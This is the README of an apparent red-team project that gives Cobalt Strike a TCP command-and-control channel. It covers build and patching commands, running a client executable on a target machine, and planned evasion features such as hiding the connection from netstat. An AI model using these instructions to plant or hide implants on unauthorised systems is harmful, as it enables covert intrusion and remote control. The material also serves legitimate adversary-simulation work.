# COBALT STRIKE TCP CHANNEL

This project provides a TCP-based communication channel for Cobalt Strike. This is meant as a base for covert channels implemented in any TCP-based protocol.

To use the channel, load up Cobalt Strike and add a new External C2 listener.
This channel is configured to run on the default Teamserver port of 2222.

Requirements: Python3 (developed on 3.9.2) and PyCryptodome

> pip3 install pycryptodome

To start the server, run the following command:

> python3 [Name].py [Teamserver IP] [Python Server IP] [Port] [Pipename] [Key] [OPTIONAL:-tp TeamserverPort -a Arch -r Restart]

- [Name] is the name of your Python server.
- [Teamserver IP] is the IP of your Cobalt Strike teamserver.
- [Python Server IP] is the IP of the machine you are running server.py on. (“0.0.0.0” has been found to work on Linux machines, though it is unknown if this behavior is consistent everywhere.)
- [Port] is the port that the server listens on to communicate with the client over. This is not the same port that the Python server uses to communicate with the teamserver.
- [Pipename] is the name of the pipe the client creates when it runs on the target. This could be any opsec appropriate pipe name approved for ops.
- [Key] AES key to encrypt the beacon that is initially sent. It must be the same as the client. (128 bit is 16 characters)
- [TeamserverPort] is the port to connect to on the Cobalt Strike teamserver. It defaults to 2222 and is an optional argument.
- [Arch] is the architecture to request from the teamserver for the beacon. It defaults to x86 and is an optional argument.
- [Restart] is a Y/N value to either restart the server after disconnect or exit. Default is N and is an optional argument.

Install MinGW

>sudo apt install mingw-w64

Once you have the MinGW compiler installed, you may compile the client C code with the following command (may need full paths to .c files):

>i686-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c aes.c base64.c -lws2_32 -static -lwsock32 -mwindows

or 64-bit with:

>x86_64-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c aes.c base64.c -lws2_32 -static -lwsock32 -mwindows

You can compile the debug version of the client with print statements by adding `-DDEBUG` to the end of the compile command

Change the client exe name if desired.
Move the resultant executable to your target machine, and then run it with the following command:

>./[Name].exe

Use the binary patcher to patch in arguments.

>python3 bipa.py [input binary] [output binary] -a [Python Server IP] -b [Port] -c [Pipename] -d [Sleep] -e [Timeout] -f [key]

- [Python Server IP], [Port], and [Pipename] must be the same as the ones passed to server.py.
- [Sleep] is the sleep time (in seconds) to wait between check ins with the server. It hits this sleep when the beacon indicates it has nothing left to send back to the server and is just checking in.
- [Timeout] is the send/recv socket timeout option (in seconds) set by setsockopt(). May remove in future.
- [key] AES key to encrypt the beacon that is initially sent. It must be the same as the client.

## CONSTRAINTS AND NOTES

- This channel expects only one client per instance of server.py. Multiple clients communicating with the same server requires multiple instances of server.py running on different ports.
- The client keeps one long TCP/TLS connection open.

## TODOS/IMPROVEMENTS

- Handle multiple clients on one server.
  - Test if you can request multiple clients/beacons from one external c2 port on TS
  - Move beacon creation args (arch and pipename) to client and have it send them to server to request from TS
  - Thread out comms loop after each new connection (based on new client id)
  - Update comms protocol to prepend new length, client id, command, command data
  - Need to figure out how encryption should be done here, otherwise all clients will need to use the same key for a server
- Update sleep timer after deployment
  - Use command and command data in new comms protocol to pass this data
- Add jitter to sleep
  - Make jitter function and pass sleep through it
- Multiple payload formats (DLL, service exe, shellcode, etc)
  - Figure out how to make each of these, this may be better done with a make file that takes a format arg to then compile from different c files that have the necessary code to do each
- Add retry to TCP
- Troubleshoot why 128 bit key works but 256 bit key does not
  - Possibly an off by one error
- Unify help documentation and provide examples with common use cases and explain what each does (ex. so user knows socket timeout needs to be larger than the sleep)
- Add option to close tcp socket while sleeping so it wont show in netstat
  - Code exists already but is commented out

## Redesign

- The protocol will have to be updated from a simple frame (4 byte length followed by that much data) to a new format that prepends a length, client id, command code, and command data. The client id is used for determining if the server is getting a new connection or if it is just continuing comms with an existing agent on a new connection. the command code and data would be for things like updating the sleep/jitter or for the client to send the initial parameters to generate the beacon from the teamserver (arch and pipename).
- The client needs to be modified to now parse the new prepended data and modify the sleep timer as needed. As well as writing the function to calculate the jitter and generate the unique client id on start.
- The server needs to be modified to spin off a new thread each time it gets a new connection so it can request a new beacon from the TS and start the comms loop. This could be done other ways but figure a new thread would have the most code reuse. The server also needs code that listens on a port for data from the TS that has updated sleep time for specific clients and then send that data to the specified client.
- Aggressor/sleep code also needs to be written to add a command for the operators to use to update the sleep times on the external c2 clients since the built in sleep command wont work here. This would take the new sleep and either a client ID or IP/port and send that to the external c2 server to send to the client.
- The other issue here is my encryption for the initial beacon transfer is patched into the executable before it is deployed. If I now have multiple clients I need them to all use the same key or figure out a way to add keys to the server for each new client and associate that to the new connection or change the encryption to be more advanced.
